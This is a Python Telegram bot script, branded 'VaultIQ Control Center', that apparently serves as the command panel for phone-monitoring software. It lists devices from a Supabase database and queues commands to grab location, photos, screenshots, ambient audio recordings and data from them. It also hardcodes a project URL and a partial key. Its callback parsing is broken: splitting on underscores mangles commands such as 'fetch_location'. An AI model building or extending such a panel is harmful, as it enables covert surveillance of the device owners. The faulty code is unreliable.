import os
import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from supabase import create_client, Client

# --- Configuration ---
# It's best to use environment variables for these on your Hetzner VPS
SUPABASE_URL = "https://orrdsscvzaginlvmbyow.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." # Replace with full Service Key if possible for bot
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"

# Initialize Supabase
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_html(
        rf"Hi {user.mention_html()}! 🚀 <b>VaultIQ Control Center</b> is active."
        "\n\nUse /devices to see all connected monitoring units."
    )

async def list_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        response = supabase.table("devices").select("*").order("last_seen", desc=True).execute()
        devices = response.data

        if not devices:
            await update.message.reply_text("❌ No devices found in database.")
            return

        keyboard = []
        for device in devices:
            # Simple online/offline check (last seen within 10 mins)
            from datetime import datetime, timezone
            last_seen = datetime.fromisoformat(device['last_seen'].replace('Z', '+00:00'))
            is_online = (datetime.now(timezone.utc) - last_seen).total_seconds() < 600
            status_icon = "🟢" if is_online else "🔴"

            btn_text = f"{status_icon} {device['device_name']} ({device['device_model']})"
            keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"dev_{device['id']}")])

        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("📱 <b>Select a device to control:</b>", reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error listing devices: {e}")
        await update.message.reply_text("❌ Error connecting to database.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data.startswith("dev_"):
        device_id = data.split("_")[1]
        await show_device_menu(query, device_id)

    elif data.startswith("cmd_"):
        parts = data.split("_")
        command = parts[1]
        device_id = parts[2]
        await send_command(query, device_id, command)

async def show_device_menu(query, device_id):
    keyboard = [
        [
            InlineKeyboardButton("📍 Location", callback_data=f"cmd_fetch_location_{device_id}"),
            InlineKeyboardButton("📸 Photo", callback_data=f"cmd_take_photo_{device_id}")
        ],
        [
            InlineKeyboardButton("🖼️ Screenshot", callback_data=f"cmd_take_screenshot_{device_id}"),
            InlineKeyboardButton("🎙️ Ambient Rec", callback_data=f"cmd_record_ambient_{device_id}")
        ],
        [
            InlineKeyboardButton("🔒 Lock", callback_data=f"cmd_lock_device_{device_id}"),
            InlineKeyboardButton("🔄 Sync", callback_data=f"cmd_sync_data_{device_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to List", callback_data="back_to_list")]
    ]

    if query.data == "back_to_list":
        # This part should call list_devices but for query
        return # Handle separately

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=f"⚙️ <b>Control Panel</b> for <code>{device_id}</code>\nChoose an action below:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def send_command(query, device_id, command):
    try:
        # Insert command into Supabase
        supabase.table("commands").insert({
            "device_id": device_id,
            "command": command,
            "status": "pending"
        }).execute()

        await query.edit_message_text(
            text=f"✅ Command <b>{command}</b> sent successfully!\nWaiting for device response...",
            parse_mode='HTML'
        )
        # Re-show menu after 3 seconds
        await asyncio.sleep(3)
        await show_device_menu(query, device_id)

    except Exception as e:
        logger.error(f"Error sending command: {e}")
        await query.edit_message_text(text=f"❌ Error: {str(e)}")

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(msg="Exception while handling an update:", exc_info=context.error)

if __name__ == '__main__':
    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        print("Error: Please set your TELEGRAM_BOT_TOKEN in bot.py")
        exit(1)

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("devices", list_devices))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    print("🚀 VaultIQ Bot is running on Hetzner VPS...")
    app.run_polling()
